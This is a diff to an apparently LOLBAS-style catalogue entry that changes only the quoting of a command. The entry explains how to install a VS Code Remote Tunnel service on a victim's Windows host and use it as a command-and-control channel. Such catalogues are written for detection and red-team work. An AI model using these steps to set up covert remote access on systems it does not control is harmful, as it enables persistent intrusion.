@@ -18,7 +18,7 @@ Usage:
     Privileges: User
     Limitations: None
     MitreID: T1546
-  - Steps: "Use \`.\code.exe tunnel service install --no-sleep\` from CLI and authorize yourself on source host with the 6-digit code or use 'Turn on Remote Tunnel Access' option in the VS Code GUI account menu and authorize yourself in the browser of target host. Then you'll get a link like: https://vscode.dev/tunnel/<victim's hostname>/<directory>. Open this link in browser and authorize yourself on source host with the same Github/Microsoft account. Once you connect with this link, an SSH connection will be created over the tunnel in order to provide end-to-end encryption."
+  - Steps: "Use '.\code.exe tunnel service install --no-sleep' from CLI and authorize yourself on source host with the 6-digit code or use 'Turn on Remote Tunnel Access' option in the VS Code GUI account menu and authorize yourself in the browser of target host. Then you'll get a link like: https://vscode.dev/tunnel/<victim's hostname>/<directory>. Open this link in browser and authorize yourself on source host with the same Github/Microsoft account. Once you connect with this link, an SSH connection will be created over the tunnel in order to provide end-to-end encryption."
     Description: Steps to create and enable a VS Code Remote Tunnel as C2 service.
     Usecase: Establishing C2 Channel on a Windows host
     Category: C2 Channel
